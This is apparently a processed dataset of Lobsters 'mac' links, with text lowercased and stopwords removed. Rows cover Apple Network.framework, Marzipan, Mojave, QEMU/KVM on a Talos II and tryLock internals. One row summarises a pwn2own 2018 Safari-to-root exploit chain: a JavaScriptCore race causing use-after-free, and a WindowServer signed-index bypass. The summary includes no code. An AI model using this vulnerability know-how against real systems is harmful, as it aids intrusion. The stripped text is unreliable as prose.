call would return nonblocking socket call able consume byte sentand completion handler two thing check forfirst check errorif error mean something went wrong trying send data generally indicates overall connection failurethen nt error perfect opportunity go see data application generate generating live data frame go fetch another frame video stream time actually enqueue next packetsthis allows pace data outand see essentially form loop using asynchronous send callback continue drain data connection handle really elegantlythe thing want point sending trick eric showed earlier great udp application sending multiple datagrams one timeso whole bunch little tiny piece data need send essentially individual packet use something added called connectionbatchso udp socket previously could send one packet time could inefficient send hundred udp packet different system call different copy context switch kernelbut call batch within block call send actually receive many time want connection hold processing data finish batch block try send datagrams one single batch system ideally one context switch kernel send interfacethis allows efficientso sendingreceiving like sending asynchronous asynchronous nature give back pressure allows pace appso case tcpbased protocol common apps reading essentially want reading type record formatlet say protocol header byte tell information receive maybe length body receiveand want read header first read rest content maybe content quite long couple megabyte let saytraditionally socket may try read bytesyou may get byte may get le keep reading get exactly byte read headerand read couple megabyte read get whole bunch different read call essentially go back forth app stackwith nwconnection call receive provide minimum data want receive maximum dataso could actually specify want receive exactly byte protocol say want minimum maximum give exactly bytesand call back either error reading connection overall read exactly bytesthen easily read whatever content need header read length let say want read couple megabyte essentially thing read body pas well want read exactly amount connection allows go back forth stack app single callback data ready goso really great way optimize interactionsbeyond sending receiving couple advanced option like highlight network parameter allow configure connection get good startup time well behavior network actually sending receivingso first one one talked many time wwdc ecn explicit congestion notificationit give way smooth connection network let end host know congestion network pace thing wellthe great thing ecn enabled default tcp connectionsyou nt anythingbut difficult past use ecn udpbased protocolsand like show first thing create ipmetadata objectecn controlled flag go ip packet ipmmetadata object allows set various flag perpacket basis wrap context object describes option various protocol want associate single send well relative priority particular messageand use context extra parameter send call besides contentso send packet going generated content flag wanted markedso really easyand also get flag whenever receiving connection context object associated receives able read specific lowlevel flag want get outsimilar service classthis property available also urlsession defines relative priority traffic affect way traffic queued local interface sending well traffic work cisco fastlane network mark service class property entire connection using service class parameter parameter objectin case show use background service class great way mark connection relatively low priority nt want get way user interactive dataso really encourage background transfer mark background service classbut also mark service class per packet basis udp connectionslet say connection voice signaling data udp flowin case create ip metadata object introduced mark service class instead ecn flag attach context send marking priority perpacket basisthe way optimize connection reduce number round trip take establish themso want highlight two approach thisone enabling fast open connectionsso tcp fast open allows send initial data first packet tcp sends syn nt wait whole handshake start sending application datanow order need enter contract application connection saying providing initial data send outso enable mark allow fast open parametersyou create connection call start actually call send get initial data sent want point completion handler replaced marker data item potent item potent mean data safe replayed initial data may get resent network nt want side effect get resentthen simply call start connection bring attempt mentioned use initial data send tcp fast openthere one way want point use tcp fast open nt require application send dataif using tl top tcp first message tl client hello actually used tcp fast open initial dataif want enable provide fast open data simply go tcpspecific option mark want enable fast open automatically grab first message tl send connection establishmentthere another thing optimize connection establishment save roundtrip something stuart mentioned previous session calling optimistic dnsthis allows use previously expired dns answer may short time live try connecting new dns query parallelso address previously received expire still valid mark expired dns behavior allowwhen call start try connecting address first wait new dns query finishthis shave lot setup time connection server indeed moved address trying multiple different connection option first one nt work gracefully wait new dns query come back try address wellso simple way appropriate server configuration get much faster connection establishmentthe next area want talk performance something nt actually need anything app getthis something get totally free whenever use urlsession networkframework connection userspace networkingso something introduced last year wwdc enabled io tvos avoiding socket layer entirely moved transport stack app give idea want start legacy model stack generally isso let say receiving packet networkit wifi interfacethat packet come driver sent tcp receive buffer within kernel application read socket going context switch copy data kernel app generally tl get another transformation decrypt data actually send applicationso look user space networking see main change moved transport stack tcp udp appso give u packet come network come driver like move memory mapped region application automatically scoop packet without copy without extra context switch start processing packet automaticallythis way transformation decryption anyway tlsthis really reduce amount cpu time take send receive packet especially protocol like udp going sending lot packet back forth directly applicationso show work effect want show video taken using app eric showed earlier demonstrate udp performance user space networkingso example going two video running simultaneouslythe device left receiving video stream application written using socketsand device right going receiving exactly video stream device app written using networkframework take advantage user space networking stackand case streaming videoit raw frame compressed great quality anything lot packet going back forthand chose specifically demonstration lower quality hit contention could nt send packet fast enough drop anything slow tonow probably app would real life highlight exactly difference performance two stacksso let see right nowso exactly data exactly frame sent fast possibly across network see one right pretty easily outstripping one leftand fact look difference percent le overhead viewing receiver side onlyand due huge difference see cpu percentage take send receive udp packet compare socket user space networkingnow course one example going every app going like going compressing differently going already trying make connection efficientbut app generating live data especially using udp send receive lot packet invite try using networkframework within app run instrumentsmeasure difference cpu usage using networkframework versus socket think really happy seeso last topic want talk today solve problem around network mobility key area trying solve networkframeworkand first step making sure start connection gracefullyso already mentioned want recap little bitthe waiting state key thing handle network transition connection first coming upit indicate lack connectivity connectivity changed middle dns tcp really encourage please avoid using apis like reachability check network state establish connectionthat lead race condition may provide accurate picture actually happening connectionand need make sure connection establish cellular network nt check front device currently cellular network could changesimply restrict interface type want use using nwparametersso started connection ready state series event give let know network changedthe first one called connection viabilityso viability mean connection able send receive data interface valid routeso give demonstration let say started connection device associated wifi networkthen user walk elevator nt signal anymoreat point give event letting know connection longer viableso point two thingswe recommend appropriate app let user know currently connectivityif trying send receive data going work right nowbut nt necessarily tear connectionat point nt better interface could use anyway first wifi interface may come backoftentimes walk back elevator onto wifi network connection resume right left offso event give better path notificationso let take scenario connected wifi networkyou walk building let say longer wifi cellular network available youat point let know two thingsfirst connection viable like also let know better path availableif connected would able use cellular networkand advice appropriate connection attempt migrate new connection resume work close original connection new connection fully readyagain wifi network may come back connection cellular may failand last case want highlight case connect initially cellular network user walk building wifi accessin case connection original one totally fine still viable also better path availablein case migrate connection probably good time try establish new connection move data overthat save user data bill continue use original connection new one fully establishedjust show look code viability update handler set connection give boolean back let know whenever viable better path update handler let know better path available longer availableand better solution handle network mobility something talked previous year multipath connection multipath tcpso able server enable multipath tcp enable client side multipathservicetype parameter connection automatically migrate network come goit great seamless experience nt require work application handleand also service type available urlsessiona couple point want highlight specific networkframeworkif restrict interface type allow used nwparameters apply mptcp still want use cellular network multipath connection instead seamlessly migrate different wifi network become availablealso connection viability handler mentioned slightly different multipath tcp whenever change network automatically move connection viable network available waiting connectivity viability better path mptcp really hope use case apps using tool like sc network reachability check network change manually replacedhowever recognize scenario still want know available network changefor networkframework offer new api called nwpathmonitorso path monitor instead watching reachability trying predict reachability given host simply let know current state interface device changeit allows iterate interface connect case want make connection one let know whenever network changeso useful want update ui let user know connected stuart mentioned previous session could scenario user long form fill nt necessarily want go fill something realize connectivity anywayso use network path monitor scenario waiting connection enoughso thing really like see people move reachability handle network transition gracefully ever beforeso like invite josh back state let know get involved start adopting networkframeworkthank tommyso got great new api think going lovewe like talk thing start using today first want talk thing like stop really take advantage new technology like user space networkingif macos network kernel extension something network kernel extension ca nt way please get touch u right awaywe need provide better alternative network kernel extension compatible user space networkingwe wanted give headsup urlsession ftp file url longer going supported proxy automatic configuration going forward supported url scheme http http number apis corefoundation layer would like stop usingthey deprecated eventually yet marked deprecatedthese cfstreamcreatepairwith anything related socket well cfsocketthese take advantage lot connection establishment put new networkframework ca nt take advantage new user space networking really want move take advantage incredibly robust connectivity improvement get networkframework urlsession improved performancethere foundation apis well like move away fromif using nsstream nsnetservice nssocket apis please move networkframework urlsessionfinally using scnetworkreachability feel wait connectivity model much better model really like move thatand case wait connectivity nt right answer nwpathmonitor much better solution going forwardso talked thing like stop want focus thing really want see dogoing forward preferred apis platform networking urlsession networkframeworkurlsession really focused http stream task provides pretty simple access tcp tl connectionsif need something advanced networkframework give great support tcp tl udp dtlsit handle listening inbound connection well outbound connection got path monitor handle mobility stuffnext step really want see adopt adopt networkframework urlsessionyour customer going appreciate much better connection much reliable connection established appreciate longer battery life better performancewhile working focus handling sending receiving really optimize performanceand take lot time get support viability better route change make difference providing seamless networking experiencenow know networkframework nt support udp multicast yet udp multicast really like understand use case take account going forwardin addition question enhancement request love hear youcontact developer support better yet meet u one lab lab lunch pm another one tomorrow morning information see urldo nt forget lab tomorrow morning lunch thank much great wwdc
297,Lobsters,mac,Apple macOS,The future of the Mac comes from iOS apps,https://www.theverge.com/2018/6/7/17438450/apple-marzipan-mac-ios-apps-port-mojave-appkit-uikit-future-platform-software,future mac come io apps,developer port io application mac apple developer guilherme rambo detailed history good place start pointed john gruber live side side pointed steve troughtonsmith commented twitter currently pretty sluggish interview extremely io interface webappstyle electron application developer david barnard,apple made big splash wwdc year announced would letting developer port io application mac sometime next year apple already started process bringing io version home stock news voice memo apps macos mojave project rumored codenamed marzipan still early stage apple even planning offering developer already fair amount confusion outcry apple whether see death traditional mac app know exactly new kind apps work whether feel like traditional native mac apps even whether fair call apps port actually going understand apple first need understand even discussion first place apple want make easier mobile developer get something like mobile apps mac well one thing clear way developer making io apps mac apps right mac app ecosystem necessarily trouble compared happening iphone past year definitely feel little stale making easier move io apps mac would certainly help apple developer guilherme rambo wrote piece year back right developer often forced choose developing supporting io app mac app world far io user mac often miss great software getting small mobilefirst apps desktop turn wildly convenient used android chromebook really great lightweight app lightweight task like scrolling instagram firing todo list window trying something similar framework limited increasing success android apps chromeos beta although still need add thing like windowing support trick get mobile apps ported whatever word really want use mobile desktop apple solution many way interesting take problem seen yet let start difference mac io apps first glance seem pretty similar use base code language like objectivec apple swift plenty underlying apis difference seems blindingly obvious boil user interface mac apps work keyboard mouse io apps work touchscreen simply moving iphone apps mac way similar google first beta android chromeos experience apple want apple solution give developer tool need make io apps get maclike user interface many mac application based software framework called appkit provides user interface element make mac app window menu button scrollers text field along highlevel softwareside thing computer need actually display application appkit date back descended original nextstep application kit detailed history good place start premarzipan macos apps appkitbased io apps uikit apple developed io created entirely new software framework displaying application called uikit designed smaller screen limited touch control io device offer mean huge chunk io apps displayed device way color shown pointed john gruber us different fundamental code framework mac apps adding complexity appkit designed mouse keyboard input whereas uikit designed touch marzipan apple looking bring uikit framework mac meaning developer theory able bring version application run mac without completely rewrite scratch appkit user interface additionally adding uikit macos native framework ported apps run natively instead simulator emulator note apple adding uikit replacing traditional appkit live side side look chart already precedence sort porting apple ecosystem ipad apps tvos apps apple tv already work similar basis built uikit share code iphone version developer easily port one platform another platform still interface consideration design control like expect ipad application simply giant iphone app apple tv app work like ipad app remote control marzipan application ported mac theory would user interface design layout best suited desktop theory anyway practice tried apple new apps macos mojave apps feel lot like ipad apps tap course something layout control feel much like ipad resize window unlike android apps chromeos redrawing window content sometimes little slow classic mac feel apps app apparent home app controlling smart home device look lot like straight port big giant button everything look like tap tap apple fundamentally belief touchscreen laptop bad idea almost every year asked apple case answer really changed apple belief touchscreen laptop uncomfortable use user research show even customer touchscreen barely use come away thinking end result going bunch apps look feel like ipad apps mac apps apple released first cut marzipan least year away available developer apple say longterm project course next year expect apple develop framework apis make apps feel little native mac pointed steve troughtonsmith poking around rudimentary marzipan support mojave developer beta suggests apple already starting adding interface element like classic mac app sidebar uikit let developer make io apps feel home macos plus already seen bunch untapped speak potential apps started diving mac menubar apps classic mac file edit view menu option keyboard shortcut many expect would quite simple add marzipan still early stage right marzipan still early stage apple access unless good digging apple filesystems four apps apple ported still sure look lot like io apps run mac might best start example developer looking follow suit goal good native mac experience tapbots developer paul haddid commented twitter uikit mac feel like running io app resizable simulator next gen mac app troughtonsmith early experiment seem agree noting resizing uikit window currently pretty sluggish noted apple senior vice president software engineering craig federighi interview wired apple already planning help developer way process tool roll developer next year able designate xcode want make variant app run macos automatically replace part app interact example long press io morph twofinger right click mac theory could developer simply bare amount effort make windowed version iphone app marzipan sure likely loweffort attempt missing point supposed offer goal replace native mac application io version idea developer able make bespoke mac version application otherwise ever made macos expand developer offer mac without extra lift writing new separate app scratch reason ported io apps necessarily indicate apple making touchscreen imac macbook pro way tvos running ported uikit io apps mean apple making ipad without touchscreen work tv remote ideally form still mac apps mouse keyboard focus mac app entail mean apple either predicting apple given day tough still room traditional mac apps developer choose support said ported apps recreation appkit app either uikit apps still uikit apps mean least right based apple apps look always going hereditary dna like extremely io interface apple ported home app meant apple tweaking next year achieve sort middle ground still presumably always room traditional mac apps developer choose support another part uikit apps might serve macos replacing webappstyle electron application sprung recent year like slack simplenote native uikitbased port io counterpart lot popular apps mac right electron apps could potentially threat mac everybody get used using modified web apps stop switching chromebook heaven forbid window much developer david barnard argues uikitbased apps desktop could offer convenient appbased experience phone computer easily especially service better apps website like bank weather apps point marzipan apps could probably offer better experience electron apps look slack ramhogging goliath mac run sweetly smoothly ipad lot depend apple make available developer right word tool start rolling third party start tinkering beyond next year much le consumer release still plenty question like whether uikit ported apps offered universal software like io ipad watchos tvos apps currently bundled whether developer able offer uikit appkit version apps mac app store still plenty question developer able take advantage potential apple seems offering big theoretical could mean fresh wave new native apps mac hugely change interact computer much way apps forever changed mobile landscape oh two final piece completely unjustified speculation fun first one knock ipad pro enough pro apps level available mac ipad pro powerful processor many capability builtin io operating system issue seems failure imagination failure operating system support maybe developer get habit making powerful apps mac new tool might go ahead make available ipad second io apps run arm processor mac run intel processor far tell real hassle getting marzipan apps going intel chip thinking maybe someday making armbased mac might want bunch apps know would run well
298,Lobsters,mac,Apple macOS,pwn2own 2018 - A Methodical Approach to Browser Exploitation,https://blog.ret2.io/2018/06/05/pwn2own-2018-exploit-development/,methodical approach browser exploitation,zero day initiative apple safari reducing target scope within jsc building javascript fuzzer performing rootcause analysis jsc vulnerability weaponizing jsc vulnerability singleclick rce evaluating safari sandbox fuzzing windowserver macos weaponizing safari sandbox escape entrypoint safari dom javascript webkit jsc vulnerability discovery exploitation riptide arbitrary uaf j object fixed recordreplay sandbox escape windowserver sandboxing windowserver vulnerability discovery exploitation frida richard zhu three attempt conclusion,industrylevel security competition organized annually trend zero day initiative invite top security researcher showcase zeroday exploit highvalue software target premiere web browser operating system virtualization solution interested participating first time year choosing target apple safari macos software platform one worked purpose competition discovered exploited two previously unknown vulnerability apple software achieve remote code execution root single click safari web browser joshua smith zdi evaluating submitted zeroday challenged u evaluate high profile target public manner extension participation event would like share series blogposts detail formulaic approach towards breaking unfamiliar target post provide candid look critical point exploitdevelopment lifecycle overview target selection discovered vulnerability post reducing target scope within jsc building javascript fuzzer performing rootcause analysis jsc vulnerability weaponizing jsc vulnerability singleclick rce evaluating safari sandbox fuzzing windowserver macos weaponizing safari sandbox escape entrypoint safari web browser portal user explore broader web expectation web evolved browser took immense level complexity effort stay relevant inevitable software scale contain bug issue security critical space modern browser exploitation dom javascript engine frequently targeted attacker major party stated complexity researching recent history security vulnerability revealed exception pattern particular drawn towards javascriptcore j engine within safari safari web browser wrapper around webkit open source browser engine javascriptcore jsc attractive target due intricate control j script exercise execution environment j effectively allows website perform somewhat arbitrary computation context end web browser normally j add dynamic client side behavior otherwise static html page model hard browser vendor constrain without regressing web know use today attacker goal break limited execution environment jsc vulnerability discovery exploitation purpose interested burning bug could discover relatively quickly one would likely bound shorter lifetime built distributed fuzzing harness augmented open source project create simple coverageguided grammar based j fuzzer roughly two week fuzzing evaluating coverage improving j grammar triaging le interesting crash fuzzer produced testcase particularly intriguing backtrace wtfcrashwithsecurityimplication callstack mean probably onto something good rootcause analysis minimized version testcase revealed actually happening discovered race condition arrayreverse riptide new concurrent garbage collector jsc right circumstance well timed call arrayreverse would produce jsarray containing number freed object scattered throughout reliably winning race gave u unique powerful primitive arbitrary uaf j object vulnerability since fixed apple cve detail jsc race condition exploited part two series detail construction j fuzzer mean vulnerability discovery part three describe use recordreplay debugging technology rootcause tricky race condition part four provide poc built consistently win data race leveraged vulnerability achieve remote code execution rce context safari sandbox escape windowserver better protect user respectable web browser employ sandboxing technology effort isolate rest system software security sandbox used limit extent damage attacker perform system event total application compromise reviewing public research sandbox brought attention macos windowserver windowserver userspace system service responsible drawing managing various graphical component macos windowserver seen p aux output macos fundamentally windowserver work processing machmessages received application running throughout system roughly endpoint windowserver act handler message handler highlight privileged attack surface reached within sandbox selection windowserver mach message handler windowserver looked like ideal target run root life userspace easier debug evaluate large amount attack surface notable history exploitable security issue windowserver vulnerability discovery exploitation windowserver undocumented private framework meant interfaced directly wrapped various higher level public graphic library limited time evaluate undocumented endpoint instead turned towards building simple inprocess fuzzer within windowserver identified three distinct dispatch routine incoming machmessages must travel ferried explicit handler function one three point tapped inprocess fuzzer help frida hooked dispatch routine could examine record bitflip replay message passed windowserver bitflipping message normal application generated allowed u rapidly evaluate eg fuzz large chunk attack surface naive understanding underlying subsystem running fuzzer le hour macbook purchased produced crashing outofbounds read importantly crashing callstack one call deep windowserver endpoint finding crash ideal implied bug would relatively easy u trigger control replaying recorded bitflips able reliably reproduce subsequently root cause crash signed comparison vulnerability windowserver crash attributed classic signed comparison issue function cgxregisterforkey take attacker controlled array index expects integer zero six however check implemented signed operation passing negative index eg would incorrectly bypass check index array bound fixed cve detail windowserver signed comparison exploited interestingly enough collided bug richard zhu fellow competitor ultimately richard failed independently land bug three attempt given certain constraint unfortunate coincidence made vulnerability rather difficult exploit sixth final blogpost series discus complexity degree code gymnastics took weaponize sandboxescape around vulnerability conclusion one venue broader public glimpse enigmatic tradecraft zeroday development series blogposts hope demystify part otherwise opaque process learned expensive mistake sheer dedication next week expand upon jsc fuzzing effort walk process performing root cause analysis complex race condition using advanced debugging technique technology update language post updated reflect series six blogposts instead five
299,Lobsters,mac,Apple macOS,New Network.framework on macOS/iOS,https://developer.apple.com/documentation/network,new networkframework macosios,page requires javascript,page requires javascriptplease turn javascript browser refresh page view content
300,Lobsters,mac,Apple macOS,Deprecation of OpenGL and OpenCL in macOS Mojave,https://developer.apple.com/macos/whats-new/,deprecation opengl opencl macos mojave,macos new user interface macos human interface guideline appkit release note app store privacy information widget human interface guideline widgetkit mac catalyst choosing user interface idiom mac app mac catalyst machine learning core ml create ml ml compute vision vision building featurerich app sport analysis natural language natural language swiftui app structure behavior safari web extension safari web extension family sharing inapp purchase skproduct skpaymenttransactionobserver device driver driverkit scsicontrollerdriverkit uniform type identifier uniform type identifier accessibility accessibility file compression apple archive screen time screen time,macos macos sdk app take advantage redesigned user interface widget notification center new swiftui layout machine learning add style transfer action classification model ready trained offer cloudkitbased deployment solution vision api addition help app analyze image video thoroughly include markup email website help siri event suggestion surface event safari add web extension customize browsing experience browser contribute screen time webusage data new user interface macos introduces redesigned user interface enhances usability approachability provides greater consistency ipados existing macos apps use systemprovided control automatically adopt new appearance app custom appearance visit macos human interface guideline learn update app continues looking great user appkit introduces variety change interface element including alert browser button menu search field segmented control toolbars detail see appkit release note app store privacy information privacy core entire macos experience new privacy information mac app store give user even transparency control personal information later year mac app store help user understand privacy practice need enter privacy practice detail app store connect display mac app store product page widget widget give user quick access timely ataglance information app macos notification center macos offer redesigned widget experience app present widget multiple size allow user customization include interactive feature update content appropriate time learn designing widget see human interface guideline learn support widget app see widgetkit framework mac catalyst apps built mac catalyst automatically adopt new look macos make full use native screen resolution mac macos new improved apis keyboard menu toolbars color panel giving greater control look behavior app learn get full control every pixel interface macspecific control pulldown menu checkboxes see choosing user interface idiom mac app learn building mac version ipad apps see mac catalyst documentation machine learning machine learning apps gain new functionality flexibility security update macos core ml add model deployment dashboard hosting deploying model using cloudkit easily make update model without updating app hosting model core ml model encryption add another layer security model handling encryption process key management core ml converter support direct conversion pytorch model core ml create ml new style transfer template stylizes photo video real time new action classification template classifies single action video clip object detection word tagger template new transfer learning option approve model accuracy training data limited training control help explore model interact model training ml compute take advantage gpus accelerate training mac information see core ml create ml ml compute developer documentation vision macos vision framework added apis trajectory detection video hand body pose estimation image video contour detection trace edge object feature image video optical flow define pattern motion consecutive video frame learn feature see vision framework documentation particular read building featurerich app sport analysis find feature come together sample app natural language natural language framework new api provide sentence embedding creates vector representation string word tagging train model classify natural language customized specific domain confidence score rank prediction information see natural language framework documentation swiftui swiftui provides selection new builtin view including progress indicator text editor also support new view layout like grid outline grid new lazy version stack load item needed starting xcode use swiftui define structure behavior entire app compose app scene containing view hierarchy define app user interface add menu command handle lifecycle event invoke system action manage storage across apps incorporating widgetkit app also create widget provide quick access important content right io home screen macos notification center information see app structure behavior safari web extension user customize safari new functionality feature adding extension leverage safari web extension inside safari access migration tool make easy convert popular extension browser safari safari extension also give user privacy control decide site extension work give access day time new extension category mac app store showcase safari extension editorial spotlight top chart family sharing inapp purchase family sharing simple way user share subscription purchase everyone household macos choose offer family sharing inapp purchase subscription whole family enjoy added benefit see skproduct skpaymenttransactionobserver new apis device driver driverkit framework add new feature support creating device driver user installs mac driver built driverkit framework run user space rather kernel extension improved system security stability macos introduces scsicontrollerdriverkit framework developing driver scsi protocolbased device uniform type identifier use new uniform type identifier framework describe file format inmemory data transfer pasteboard identify resource directory volume package accessibility new accessibility framework let app dynamically deliver subset accessible content user based context file compression use new apple archive framework perform fast multithreaded lossless compression directory file data macos screen time macos includes screen time apis sharing managing webusage data observing change parent guardian make detail see screen time framework documentation
301,Lobsters,mac,Apple macOS,WWDC18,https://developer.apple.com/wwdc/,,full stream ahead watch video,full stream ahead join u wwdc like never jampacked allonline experience coming apple park watch video
302,Lobsters,mac,Apple macOS,"Another weekend on the new computer (or, making the Talos II into the world's biggest Power Mac)",http://tenfourfox.blogspot.com/2018/06/another-weekend-on-new-computer-or.html,another weekend new computer making talos ii world biggest power mac,problem using virtualization run power mac operating system necessary kvm module kvmpr read patent radioshark preserved part,eye deceive qemu running tiger full virtualization talos ii proof look qemu command line terminal window turned recall last entry problem using virtualization run power mac operating system necessary kvm module kvmpr nt load baremetal system powernv baremetal mean run mac operating system pure emulation eked something equivalent system profiler still drag minimal tweak kvmpr able coax tiger start virtualization increasing apparent cpu speed hardly quad fastest power mac ever see fastest frontside bus ever see ever maximum effort issue actually little complex described thanks paul mackerras ibm ozlabs pointing right direction let give little background first turn virtual address actual real address powerpc power processor prior exclusively used hash table page table entry ptes hptes depending writing find correct location memory process simplified fashion thus given virtual address processor translates key block memory using segment lookaside buffer slb hash key part address narrow two page table entry group ptegs containing eight ptes processor check entry match continues else sends page fault operating system map memory first problem format hptes changed slightly need accommodated host cpu lookup kvmhv already converted new thus work already bigger problem though hash table complex manage worst case could require lot search map page earlier reduce cost translation lookaside buffer tlb used cache pte found however another option called radix mmu scheme read patent bored slb entry block memory radix page table pointer rptp rptp turn point chain hierarchical translation table radix tree series cascading lookup build real address page ram fast flexible particularly wellsuited discontinuous tract addressing space however implementational detail guest operating system running user mode ie kvmpr radix host limitation socalled quadrant memory range nt problem vm execute supervisor instruction ie kvmhv remap necessary kvmhv ca nt emulate kvmpr fortunately still support hpt turn radix mmu booting kernel disableradix get around second problem turn first problem actually nt problem booting o x kvm radix mode assuming hack kvmpr kernel module handle couple extra interrupt type remove lockout anyway lot wanting geekbench number wo nt competitive bunch always demanding know score let set two baseline first trusty backup workstation imac fast cache make worse arm great formfactor never equaled love screen fit well desk get fairly weak geekbench geekbench integer floating point memory stream second baseline use trusty quad left reduced power mode since normally run reduced get decent geekbench first geekbench pure emulation using tcg jit aah forget nt going wait night hacked kvmpr well damn son range least math performance four thread poor thing one qemu power mac emulation yet support smp even kvm remember intentionally run gimped going full blast would blown world baddest power mac water still decent showing mac mode given overhead going running firefox buttload tab lot terminal session think playing movie something background note record number seem bit suspect although may well performance delta image compression decompression nt different would likely direction likewise poor showing standard library memory work might syscall overhead plausible nt explain copy faster simple write regardless heap better emulated cpu would nt finished even time went dinner nice thing kvmprhackymchackface nt require change qemu work though hack pretty hacky sufficient boot mac o cause kernel module err failure memory mapped io probably actually need first problem fixed similarly would expect linux netbsd wo nt happy either reason let alone nesting kvmpr within allowed even supported also io performance qemu regardless kvm dismal even hacked kvmpr raw disk image rebuilding stripped qemu disk network throughput quite slow even worse lot graphic update occurring simultaneously installing mac o x onscreen aqua progress bar minimizing window help able course ominously get occasional soft lockout kernel though everything keep running usually heavy disk access act strangely stuff mess hardware system update reason let software update run emulated mode bug occurred installation would nt completely hose everything make disk image unbootable fact happen first time tried upgrade another unrelated annoyance qemu emulated video card nt offer resolution inconvenient display could probably hack later qemu also bug course support running o x much still work progress example notice screenshots running tenfourfox ca nt installed version tried running qemukvmpr tenfourfox crashed illegal instruction fault tried starting safe mode assumption jit making unsteady seemed work gave safe mode window tried start full browser still crashed illegal instruction fault different place point assumed bug kvmpr tried starting pure emulation time tenfourfox crashed entire emulator exited illegal instruction fault think safely conclude bug qemu nt even tried running classic yet almost afraid still mean lot along able run power mac software also mean need go reprogram autokey remappings remap commandkey combination actually qemu pain worth enough people interested playing go post diff gist new microsoft visual github remember rock sock taint kernel possibly crash computer definitely slap yo mama also need apply patch source code current kernel whatever post binary make bad irresponsible self wo nt wait long build linux kernel scratch relevant module minute playing power else learn weekend want disableradix stick bootup put grub config petitboot pick particularly helpful still ca nt figure putting bootkernfw enable radeon card petitboot still come blank screen unless pull vga disable jumper amdgpu still glitchy sometimes trying view large image eye gnome actually caused graphic corruption garbled mouse pointer session quickly became unusable bail restart viewnior substituted nicely nt problem also found hugin trying find something view equirectangular panorama taken ricoh theta camera eventually hacked freepv building substitute nicely well gave entry usrshareapplications could directly view image gnome file manager symlinking xdgopen open mean still open thing command line o x command dickens time getting android pixel xl talk gnome kept throwing mtp error tried mount yes phone mtp mode could list directory ptp mode could nt actually transfer anything even adb shell would disconnect command adb pull would nt even get past enumerating file list eventually found apocryphal note someone fixed phone connecting usb instead usb found usb hub plugged plugged pixel xl work cable work fine usb speed macbook air pixel assuming issue chipset also think google bug raptor fedora freely distributable linux font improving still suck transferred entire font folder afp otf ttf font worked immediately fondu easily converted dfont font also lot old mac font even font suitcase pure resource fork gnome nt know transfer could tried copying fat volume extracting resource fork hidden directory seemed icky thought went terminal instead l fgrep vi ttf fgrep vi otf fgrep vi dfont fgrep vi bmap perl ne chomp print n xargs n macbinconv mac mb homespectrerfont bin little snippet perl preserve embedded space filename ran turned font resource macbinary transferred resulting file fondu converted well font speaking font wanted play font hinting individual font basis installed font tweak gnome started converted lucida grande use display theme eliminated antialiasing made much display painfully jaggy could nt life figure undo even uninstalling font tweak found configfontconfigconfd removed offending entry able get radioshark play audio required little setup first first compile shark tool linux fortunately preserved part radiosh worked little adjustment new tool kept throwing permission error nt really want run root problem us libhid talk hid portion radioshark libhid expects able enumerate usb device encounter see really hid eventually hit udev recipe added new usb group subsystem usb group usb mode shark control listen vlc using url like pulse deadpool pretty funny good first way going outoutrageous gag little forced sometimes brolin made solid cable domino outstanding hey kiwi kid act nt stereotyped even recognized driving along crowsnest highway bc near manning park merge transcanada hope beautiful road driven many time plus midcredits scene made movie hole said carefully avoiding joke sure stay put musical laughoutloud moment end back tomorrow work datetime picker tenfourfox abandoned cs grid time current implementation actually worse trying render discouraging least gracefully degrades given change made hpte format get kvmpr work o x may even necessary run kernel radix mode try coming weekend point
304,Lobsters,mac,Apple macOS,tryLock vs lock,https://yurylapitsky.com/trylock_vs_lock,trylock v lock,trylock v lock introduction previous post analysis notice threadswitch summary reference,trylock v lock introduction previous post retain release found synchronized access reference counter built lock us trylock function first trylock lock slow path used lock function however concrete information lock slower trylock post try find explain analysis start point defined like declaration spinlockt following class spinlockt oslockhandoffs mlock public spinlockt mlock oslockhandoffinit void lock oslocklock mlock void unlock oslockunlock mlock bool trylock return oslocktrylock mlock next target journey oslockhandoffs oslocklock oslockunlock say oslockhandoffs quick search internet say type defined system private header lockprivateh probably true header included nsojectm include oslockprivateh private header mean described functionality supposed used developer also type covered documentation official source ok get source le official documentation let take look reverse engineering tool start obvious way know retain release part objectivec language explicitly part nsobject implementation nsobject one root class foundation framework platform build foundationframework applicationsxcodeappcontentsdeveloperplatforms macosxplatformdevelopersdksmacosxsdksystemlibraryframeworks iphonesimulatorplatformdevelopersdksiphonesimulatorsdksystemlibraryframeworks notice current post written entirely based xcode version macos sierra use binary iphonesimulator platform nm initial symbol search nm foundation grep oslocklock foundation binary located foundationframeworkfoundation output following undefined external oslocklock libsystem found oslocklock located library libsystem binary contains list required dependency find using otool otool l foundation grep libsystem usrliblibsystemdylib compatibility version current version exactly need let try find symbol discovered dylib using provided path nm usrliblibsystemdylib grep oslocklock get empty result libsystem refers multiple library inside probably kind global entry point system functionality otool l usrliblibsystemdylib usrliblibsystemdylib usrliblibsystembdylib compatibility version current version usrlibsystemlibcachedylib compatibility version current version usrlibsystemlibcommoncryptodylib compatibility version current version usrlibsystemlibcompilerrtdylib compatibility version current version usrlibsystemlibcopyfiledylib compatibility version current version usrlibsystemlibcorecryptodylib compatibility version current version usrlibsystemlibdispatchdylib compatibility version current version usrlibsystemlibdylddylib compatibility version current version usrlibsystemlibkeymgrdylib compatibility version current version usrlibsystemliblaunchdylib compatibility version current version usrlibsystemlibmachodylib compatibility version current version usrlibsystemlibquarantinedylib compatibility version current version usrlibsystemlibremovefiledylib compatibility version current version usrlibsystemlibsystemasldylib compatibility version current version usrlibsystemlibsystemblocksdylib compatibility version current version usrlibsystemlibsystemcdylib compatibility version current version usrlibsystemlibsystemconfigurationdylib compatibility version current version usrlibsystemlibsystemcoreservicesdylib compatibility version current version usrlibsystemlibsystemcoretlsdylib compatibility version current version usrlibsystemlibsystemdnssddylib compatibility version current version usrlibsystemlibsysteminfodylib compatibility version current version usrlibsystemlibsystemkerneldylib compatibility version current version usrlibsystemlibsystemmdylib compatibility version current version usrlibsystemlibsystemmallocdylib compatibility version current version usrlibsystemlibsystemnetworkdylib compatibility version current version usrlibsystemlibsystemnetworkextensiondylib compatibility version current version usrlibsystemlibsystemnotifydylib compatibility version current version usrlibsystemlibsystemplatformdylib compatibility version current version usrlibsystemlibsystempthreaddylib compatibility version current version usrlibsystemlibsystemsandboxdylib compatibility version current version usrlibsystemlibsystemsecinitdylib compatibility version current version usrlibsystemlibsystemsymptomsdylib compatibility version current version usrlibsystemlibsystemtracedylib compatibility version current version usrlibsystemlibunwinddylib compatibility version current version usrlibsystemlibxpcdylib compatibility version current version via simple enumeration check search symbol table dylib find usrlibsystemlibsystemplatformdylib next stop nm usrlibsystemlibsystemplatformdylib grep oslocklock text text external oslocklock mean libsystemplatformdylib contains oslocklock string symbol table try disassemble objdump macho disassemble 